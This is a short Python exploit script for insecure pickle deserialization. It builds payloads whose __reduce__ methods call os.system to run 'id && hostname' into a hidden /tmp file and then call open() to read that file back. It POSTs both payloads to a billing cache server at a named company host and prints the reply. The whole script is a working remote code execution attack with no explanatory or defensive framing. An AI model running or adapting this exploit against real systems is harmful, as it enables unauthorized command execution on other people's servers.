#!/usr/bin/env python3
import pickle
import base64
import requests
import os

# Payload 1: Execute id && hostname and write to file
class WriteCommand:
    def __reduce__(self):
        cmd = "id && hostname > /tmp/.rex_deser_bill"
        return (os.system, (cmd,))

payload1 = base64.b64encode(pickle.dumps(WriteCommand())).decode()

# Send first request
requests.post("http://cache.billing.northstar-logistics.com:8001", data=payload1)

# Payload 2: Read the file
class ReadFile:
    def __reduce__(self):
        return (open, ('/tmp/.rex_deser_bill', 'r'))

payload2 = base64.b64encode(pickle.dumps(ReadFile())).decode()

# Send second request and print response
resp = requests.post("http://cache.billing.northstar-logistics.com:8001", data=payload2)
print(resp.text)
